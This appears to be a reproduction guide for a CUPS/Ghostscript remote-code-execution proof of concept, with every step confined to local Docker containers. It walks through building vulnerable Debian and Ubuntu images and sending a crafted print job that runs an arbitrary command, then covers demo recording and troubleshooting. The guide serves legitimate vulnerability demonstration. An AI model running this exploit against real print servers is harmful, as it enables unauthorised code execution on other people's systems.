# Reproducing it yourself

Everything below runs on your own machine. There is no remote target, no
internet-facing service, nothing to point at anyone else.

## What you need

- Docker
- Python 3.9+ (the client is standard library only)
- a terminal you can record
- optional: `ffmpeg`, if you want to turn the recording into a GIF

## 1. Get the repo and the vulnerable build

```bash
git clone https://github.com/DeathShotXD/Upload2Shell
cd Upload2Shell
./fetch-debs.sh
```

`fetch-debs.sh` pulls the last vulnerable Ghostscript packages for Debian 13
(`+deb13u1`) from snapshot.debian.org into `debs/`. It prints the package and
version it grabbed.

## 2. Build and start the printer

```bash
docker build -t upload2shell-pwn .
docker run -d --name u2s-pwn -p 127.0.0.1:6310:631 upload2shell-pwn
```

Give cupsd a second, then check the queue is really there:

```bash
docker exec u2s-pwn lpstat -p u2s
```

## 3. Send the job

This sends one anonymous Print-Job, exactly like a normal remote print would:

```bash
python3 cups_poc.py -t 127.0.0.1:6310 -q u2s --cmd 'id > /tmp/pwned'
```

A clean run looks like:

```
Upload2Shell 0.2.0  (CVE-2026-125396)
  target   127.0.0.1:6310/u2s
  payload  4536 bytes
  command  id > /tmp/pwned
  status   0x0000 (successful-ok)  HTTP 200
  job-id   1
```

## 4. Read the result

```bash
docker exec u2s-pwn cat /tmp/pwned
```

You want to see:

```
uid=7(lp) gid=7(lp) groups=7(lp)
```

That is the command running as the CUPS filter account, not as root.

## 5. The same thing on Ubuntu

The Ubuntu images are built the same way, just with that distro's vulnerable
packages in `ubuntu/debs-noble` or `ubuntu/debs-jammy` instead of the Debian
ones. Map a different host port so you can keep all three up at once:

```bash
docker run -d --name u2s-noble -p 127.0.0.1:6311:631 upload2shell-noble
python3 cups_poc.py -t 127.0.0.1:6311 -q u2s --cmd 'id > /tmp/pwned'
docker exec u2s-noble cat /tmp/pwned
```

Ubuntu needs the `discard://` backend instead of `file:` (the entrypoint
already handles that).

## Recording a short PoC

Keep it under about 25 seconds. The sequence that reads well on screen:

1. `docker exec u2s-pwn lpstat -p u2s` (shows the queue is live)
2. `python3 cups_poc.py -t 127.0.0.1:6310 -q u2s --cmd 'id > /tmp/pwned'`
3. `docker exec u2s-pwn cat /tmp/pwned` (the `uid=7(lp)` line)

Recording with ffmpeg on X11:

```bash
ffmpeg -f x11grab -framerate 20 -video_size 1280x720 -i :0.0 -t 25 poc.mp4
```

Or grab a region with `slop` if you only want the terminal:

```bash
ffmpeg -f x11grab -framerate 20 -video_size "$(slop -f '%wx%h')" \
  -i ":0.0+$(slop -f '%X,%Y')" -t 25 poc.mp4
```

On Wayland, `peek` or `kooha` are easier; export to mp4.

### Turn it into assets/demo.gif

The README expects `assets/demo.gif`. Convert with a two-pass palette so the
terminal text stays sharp:

```bash
ffmpeg -i poc.mp4 -vf "fps=12,scale=960:-1:flags=lanczos,split[a][b];\
[a]palettegen[p];[b][p]paletteuse" -loop 0 assets/demo.gif
```

Aim for a few hundred KB. If it is heavy, drop `fps` to 10 or `scale` to 800.

## Cleaning up

```bash
docker rm -f u2s-pwn u2s-noble u2s-jammy
```

## If the command does not fire

- Give cupsd a couple of seconds after `docker run` before sending the job.
- Make sure you are posting to the container (`127.0.0.1:6310`) and not to a
  CUPS daemon that happens to be running on the host on `:631`.
- `docker exec u2s-pwn tail -n 50 /var/log/cups/error_log` shows the filter
  chain and any Ghostscript errors.
- A long-lived worker can miss the overlap on the first try; send the job
  again.
